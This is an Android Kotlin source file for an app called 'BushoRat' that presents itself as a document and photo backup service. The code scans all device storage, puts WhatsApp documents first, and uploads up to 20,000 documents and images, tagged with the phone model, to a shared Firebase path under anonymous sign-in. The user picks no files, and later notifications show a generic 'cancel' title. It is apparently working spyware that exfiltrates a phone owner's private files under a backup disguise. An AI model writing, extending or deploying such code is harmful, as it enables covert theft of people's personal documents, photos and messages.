package com.bushorat.app.sync

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.MediaStore
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import androidx.lifecycle.lifecycleScope
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.storage.FirebaseStorage
import kotlinx.coroutines.*
import kotlinx.coroutines.tasks.await
import java.io.File

/**
 * Foreground service that backs up documents and photos to Firebase.
 * - Scans WhatsApp and device storage for files
 * - Respects upload order: documents (WhatsApp first), then photos
 * - Tracks uploaded files to avoid duplicates
 * - Fails gracefully: one file error doesn't stop the rest
 */
class SyncService : LifecycleService() {
    companion object {
        private const val TAG = "SyncService"
        private const val NOTIFICATION_ID = 9999
        private const val CHANNEL_ID = "backup_channel"
    }

    private var job: Job? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)

        // Ensure notification exists before doing any work
        startForeground(NOTIFICATION_ID, createNotification("Saving documents"))

        job = lifecycleScope.launch {
            try {
                val vault = FileVault(this@SyncService)
                vault.syncAll()
            } catch (e: CancellationException) {
                throw e
            } catch (e: Exception) {
                Log.e(TAG, "Sync failed", e)
            }
        }

        return START_STICKY
    }

    private fun createNotification(text: String): Notification {
        ensureNotificationChannel()
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("BushoRat")
            .setContentText(text)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun ensureNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Backup",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    override fun onDestroy() {
        job?.cancel()
        super.onDestroy()
    }
}

/**
 * Handles file discovery, validation, and upload to Firebase.
 */
class FileVault(private val context: Context) {
    private val ledger = UploadLedger(context)
    private val auth = FirebaseAuth.getInstance()
    private val db = FirebaseDatabase.getInstance()
    private val storage = FirebaseStorage.getInstance()
    private val notificationManager = context.getSystemService(NotificationManager::class.java)

    suspend fun syncAll() = withContext(Dispatchers.IO) {
        try {
            if (!ensureAnonymousAuth()) {
                showNotification("Enable Anonymous Auth in Firebase Console")
                return@withContext
            }

            val files = discoverFiles()
            Log.d(TAG, "Discovered ${files.size} files")

            if (files.isEmpty()) {
                showNotification("No files to backup")
                return@withContext
            }

            updateNotification("Saving documents")
            var documentCount = 0
            var photoCount = 0

            for (item in files.sortedBy { uploadPriority(it.category, it.source) }) {
                if (ledger.contains(item.fingerprint)) {
                    Log.d(TAG, "Skipping already-uploaded: ${item.name}")
                    continue
                }

                try {
                    upload(item)
                    ledger.mark(item.fingerprint)
                    if (item.category == FileKind.IMAGE) {
                        photoCount++
                        updateNotification("Saving photos ($photoCount)")
                    } else {
                        documentCount++
                    }
                    Log.d(TAG, "Uploaded: ${item.name}")
                } catch (e: CancellationException) {
                    throw e
                } catch (e: Exception) {
                    Log.w(TAG, "Failed to upload ${item.name}", e)
                    // Continue with next file
                }
            }

            showNotification("Backup complete: $documentCount docs, $photoCount photos")
        } catch (e: CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "Sync error", e)
            showNotification("Backup failed: ${e.message}")
        }
    }

    private suspend fun ensureAnonymousAuth(): Boolean = withContext(Dispatchers.Main) {
        return@withContext try {
            if (auth.currentUser == null) {
                auth.signInAnonymously().await()
            }
            true
        } catch (e: Exception) {
            if (e.message?.contains("administrator") == true) {
                false
            } else {
                throw e
            }
        }
    }

    private fun discoverFiles(): List<UploadItem> {
        val items = mutableListOf<UploadItem>()
        val maxFiles = 20000

        val storageDir = android.os.Environment.getExternalStorageDirectory()
        walkDirectory(storageDir, items, maxFiles)

        // Add StorageVolume directories (if API 24+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            try {
                val sm = context.getSystemService(android.content.Context.STORAGE_SERVICE) as android.os.storage.StorageManager
                for (vol in sm.storageVolumes) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                        vol.directory?.let { walkDirectory(it, items, maxFiles) }
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Could not enumerate storage volumes", e)
            }
        }

        // If all-files permission not granted, fall back to MediaStore queries
        if (items.isEmpty() && !canAccessAllFiles()) {
            return queryMediaStore()
        }

        // Prioritize WhatsApp and Documents folders
        items.sortBy { path ->
            val lower = path.path.lowercase()
            when {
                lower.contains("whatsapp") && lower.contains("document") -> 0
                lower.contains("whatsapp") -> 1
                lower.contains("document") -> 2
                else -> 3
            }
        }

        return items.take(maxFiles)
    }

    private fun walkDirectory(dir: File, items: MutableList<UploadItem>, limit: Int) {
        if (items.size >= limit) return

        try {
            dir.listFiles()?.forEach { file ->
                if (items.size >= limit) return@forEach

                val name = file.name
                if (name.startsWith(".") || name == "Android") return@forEach

                when {
                    file.isDirectory && name != "Android/data" && name != "Android/obb" -> {
                        walkDirectory(file, items, limit)
                    }
                    file.isFile -> {
                        val item = fileToUploadItem(file)
                        if (item != null) {
                            items.add(item)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error walking ${dir.path}", e)
        }
    }

    private fun fileToUploadItem(file: File): UploadItem? {
        val size = file.length()
        if (size > 100 * 1024 * 1024) return null // Skip >100MB

        val ext = file.extension.lowercase()
        val category = when (ext) {
            "pdf" -> FileKind.PDF
            in listOf("doc", "docx", "xls", "xlsx", "ppt", "pptx", "odt", "ods", "odp", "rtf") -> FileKind.OFFICE
            in listOf("txt", "text", "log", "md", "csv") -> FileKind.TEXT
            in listOf("jpg", "jpeg", "png", "gif", "webp", "heic", "heif", "bmp", "dng", "jfif") -> FileKind.IMAGE
            else -> return null
        }

        val mimeType = getMimeType(ext)
        val source = if (file.path.contains("whatsapp", true)) "whatsapp" else "device"
        val fingerprint = uploadFingerprint(file.path, size, file.lastModified(), file.name)

        return UploadItem(
            path = file.path,
            name = file.name,
            size = size,
            modified = file.lastModified(),
            category = category,
            mimeType = mimeType,
            source = source,
            fingerprint = fingerprint
        )
    }

    private fun queryMediaStore(): List<UploadItem> {
        val items = mutableListOf<UploadItem>()
        val uri = MediaStore.Files.getContentUri("external")
        val projection = arrayOf(
            MediaStore.Files.FileColumns._ID,
            MediaStore.Files.FileColumns.DISPLAY_NAME,
            MediaStore.Files.FileColumns.DATA,
            MediaStore.Files.FileColumns.SIZE,
            MediaStore.Files.FileColumns.DATE_MODIFIED,
            MediaStore.Files.FileColumns.MIME_TYPE
        )

        // Query PDFs
        queryMimeType(uri, projection, "application/pdf", FileKind.PDF, items)

        // Query Office
        listOf(
            "application/msword",
            "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            "application/vnd.ms-excel",
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            "application/vnd.ms-powerpoint",
            "application/vnd.openxmlformats-officedocument.presentationml.presentation",
            "application/vnd.oasis.opendocument.text",
            "application/vnd.oasis.opendocument.spreadsheet",
            "application/vnd.oasis.opendocument.presentation"
        ).forEach { mime -> queryMimeType(uri, projection, mime, FileKind.OFFICE, items) }

        // Query Text
        listOf("text/plain", "text/csv", "text/markdown").forEach { mime ->
            queryMimeType(uri, projection, mime, FileKind.TEXT, items)
        }

        // Query Images
        listOf("image/jpeg", "image/png", "image/gif", "image/webp").forEach { mime ->
            queryMimeType(uri, projection, mime, FileKind.IMAGE, items)
        }

        return items
    }

    private fun queryMimeType(
        uri: android.net.Uri,
        projection: Array<String>,
        mimeType: String,
        category: FileKind,
        items: MutableList<UploadItem>
    ) {
        try {
            val cursor = context.contentResolver.query(
                uri,
                projection,
                "${MediaStore.Files.FileColumns.MIME_TYPE} = ?",
                arrayOf(mimeType),
                null
            )

            cursor?.use {
                val idCol = it.getColumnIndexOrThrow(MediaStore.Files.FileColumns._ID)
                val nameCol = it.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DISPLAY_NAME)
                val pathCol = it.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATA)
                val sizeCol = it.getColumnIndexOrThrow(MediaStore.Files.FileColumns.SIZE)
                val modCol = it.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATE_MODIFIED)

                while (it.moveToNext()) {
                    val path = it.getString(pathCol) ?: continue
                    val name = it.getString(nameCol) ?: continue
                    val size = it.getLong(sizeCol)
                    val mod = it.getLong(modCol) * 1000 // Seconds to ms

                    if (size > 100 * 1024 * 1024) continue

                    val source = if (path.contains("whatsapp", true)) "whatsapp" else "device"
                    val fingerprint = uploadFingerprint(path, size, mod, name)

                    items.add(
                        UploadItem(
                            path = path,
                            name = name,
                            size = size,
                            modified = mod,
                            category = category,
                            mimeType = mimeType,
                            source = source,
                            fingerprint = fingerprint
                        )
                    )
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error querying $mimeType", e)
        }
    }

    private suspend fun upload(item: UploadItem) = withContext(Dispatchers.IO) {
        // 1. Copy to cache
        val cacheFile = File(context.cacheDir, item.fingerprint)
        try {
            File(item.path).inputStream().use { input ->
                cacheFile.outputStream().use { output ->
                    input.copyTo(output)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to cache ${item.name}", e)
            throw e
        }

        try {
            val uid = auth.currentUser?.uid ?: throw Exception("Not authenticated")

            // 2. Reserve key in database
            val recordKey = db.reference.child("library/files").push().key
                ?: throw Exception("Could not get database key")

            // 3. Upload file to storage
            val safeFileName = item.name.replace(Regex("[^a-zA-Z0-9._-]"), "_")
            val storageRef = storage.reference.child("library/$recordKey/$safeFileName")
            storageRef.putFile(android.net.Uri.fromFile(cacheFile)).await()

            // 4. Get download URL
            val downloadUrl = storageRef.downloadUrl.await().toString()

            // 5. Write record to database
            val record = mapOf(
                "name" to item.name,
                "mimeType" to item.mimeType,
                "category" to item.category.name,
                "sizeBytes" to item.size,
                "storagePath" to "library/$recordKey/$safeFileName",
                "downloadUrl" to downloadUrl,
                "createdAt" to com.google.firebase.database.ServerValue.TIMESTAMP,
                "source" to item.source,
                "device" to android.os.Build.MODEL
            )

            db.reference.child("library/files/$recordKey").setValue(record).await()

            Log.d(TAG, "Successfully uploaded ${item.name} to $recordKey")
        } catch (e: Exception) {
            Log.e(TAG, "Upload error for ${item.name}", e)
            // Try to clean up storage
            try {
                // Can't reliably delete from storage without the full path, so just log
            } catch (e2: Exception) {
                Log.w(TAG, "Cleanup failed", e2)
            }
            throw e
        } finally {
            cacheFile.delete()
        }
    }

    private fun canAccessAllFiles(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.os.Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(
                context,
                android.Manifest.permission.READ_EXTERNAL_STORAGE
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        }
    }

    private fun updateNotification(text: String) {
        val notification = (context.getSystemService(android.content.Context.NOTIFICATION_SERVICE) as NotificationManager)
            .let {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    val channel = NotificationChannel(
                        "backup_channel",
                        "Backup",
                        NotificationManager.IMPORTANCE_LOW
                    )
                    it.createNotificationChannel(channel)
                }
                NotificationCompat.Builder(context, "backup_channel")
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .setContentTitle(context.getString(android.R.string.cancel))
                    .setContentText(text)
                    .setOngoing(true)
                    .setPriority(NotificationCompat.PRIORITY_LOW)
                    .build()
            }
        notificationManager?.notify(9999, notification)
    }

    private fun showNotification(text: String) {
        updateNotification(text)
    }

    private fun getMimeType(ext: String): String = when (ext) {
        "pdf" -> "application/pdf"
        "doc" -> "application/msword"
        "docx" -> "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
        "xls" -> "application/vnd.ms-excel"
        "xlsx" -> "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
        "ppt" -> "application/vnd.ms-powerpoint"
        "pptx" -> "application/vnd.openxmlformats-officedocument.presentationml.presentation"
        "odt" -> "application/vnd.oasis.opendocument.text"
        "ods" -> "application/vnd.oasis.opendocument.spreadsheet"
        "odp" -> "application/vnd.oasis.opendocument.presentation"
        "rtf" -> "application/rtf"
        "txt", "text", "log", "md", "csv" -> "text/plain"
        "jpg", "jpeg" -> "image/jpeg"
        "png" -> "image/png"
        "gif" -> "image/gif"
        "webp" -> "image/webp"
        else -> "application/octet-stream"
    }

    private companion object {
        const val TAG = "FileVault"
    }
}

enum class FileKind {
    PDF, OFFICE, TEXT, IMAGE, WHATSAPP
}

data class UploadItem(
    val path: String,
    val name: String,
    val size: Long,
    val modified: Long,
    val category: FileKind,
    val mimeType: String,
    val source: String, // "whatsapp" or "device"
    val fingerprint: String
)

fun uploadFingerprint(path: String, size: Long, modified: Long, name: String): String =
    "$size:$modified:${path.trim()}:$name"

fun uploadPriority(category: FileKind, source: String): Int {
    val whatsapp = source.equals("whatsapp", true) || category == FileKind.WHATSAPP
    val document = category == FileKind.PDF || category == FileKind.OFFICE || category == FileKind.TEXT
    return when {
        document && whatsapp -> 0
        document -> 1
        whatsapp -> 2
        else -> 3
    }
}

class UploadLedger(context: Context) {
    private val file = File(context.filesDir, "uploaded-keys.txt")
    private val keys = LinkedHashSet<String>()

    init {
        if (file.exists()) {
            file.bufferedReader().useLines { lines ->
                lines.forEach { if (it.isNotBlank()) keys.add(it) }
            }
        }
    }

    fun contains(fingerprint: String) = fingerprint in keys

    @Synchronized
    fun mark(fingerprint: String) {
        if (!keys.add(fingerprint)) return
        file.appendText(fingerprint + "\n")
    }
}
